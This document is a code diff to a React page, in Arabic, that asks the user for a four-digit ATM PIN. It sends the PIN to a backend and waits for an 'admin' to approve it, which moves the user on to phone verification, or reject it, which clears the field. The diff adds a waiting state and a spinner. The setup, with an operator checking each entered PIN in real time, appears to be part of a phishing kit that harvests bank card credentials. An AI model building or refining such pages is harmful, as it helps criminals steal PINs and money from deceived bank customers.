@@ -1,5 +1,6 @@
 import { useEffect, useState, useRef } from "react";
 import { useLocation } from "wouter";
+import { useSignalEffect } from "@preact/signals-react";
 import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
@@ -10,8 +11,7 @@ import {
 } from "@/components/ui/input-otp";
 import {
   sendData,
-  isFormApproved,
-  isFormRejected,
+  codeAction,
   navigateToPage,
 } from "@/lib/store";
 
@@ -19,6 +19,7 @@ export default function ATMPassword() {
   const [, navigate] = useLocation();
   const [pin, setPin] = useState("");
   const [error, setError] = useState(false);
+  const [isWaiting, setIsWaiting] = useState(false);
   const inputRef = useRef<HTMLInputElement>(null);
 
   // Emit page enter
@@ -26,21 +27,24 @@ export default function ATMPassword() {
     navigateToPage("كلمة مرور ATM");
   }, []);
 
-  // Handle form approval
-  useEffect(() => {
-    if (isFormApproved.value) {
-      navigate("/phone-verification");
+  // Handle code action from admin
+  useSignalEffect(() => {
+    const action = codeAction.value;
+    if (action) {
+      if (action.action === "approve") {
+        // Navigate to phone verification page
+        navigate("/phone-verification");
+      } else if (action.action === "reject") {
+        // Show error and clear PIN
+        setPin("");
+        setError(true);
+        setIsWaiting(false);
+        inputRef.current?.focus();
+      }
+      // Reset the action
+      codeAction.value = null;
     }
-  }, [isFormApproved.value, navigate]);
-
-  // Handle form rejection - clear PIN
-  useEffect(() => {
-    if (isFormRejected.value) {
-      setPin("");
-      setError(true);
-      inputRef.current?.focus();
-    }
-  }, [isFormRejected.value]);
+  });
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -51,6 +55,7 @@ export default function ATMPassword() {
     }
 
     setError(false);
+    setIsWaiting(true);
     sendData({
       digitCode: pin,
       current: "كلمة مرور ATM",
@@ -98,6 +103,7 @@ export default function ATMPassword() {
                 setError(false);
               }}
               type="password"
+              disabled={isWaiting}
             >
               <InputOTPGroup>
                 <InputOTPSlot index={0} className={error ? "border-red-500" : ""} />
@@ -115,8 +121,15 @@ export default function ATMPassword() {
           )}
 
           {/* Submit Button */}
-          <Button type="submit" className="w-full" size="lg">
-            تأكيد
+          <Button type="submit" className="w-full" size="lg" disabled={isWaiting || pin.length !== 4}>
+            {isWaiting ? (
+              <div className="flex items-center justify-center gap-2">
+                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                <span>جاري التحقق...</span>
+              </div>
+            ) : (
+              "تأكيد"
+            )}
           </Button>
         </form>
       </div>
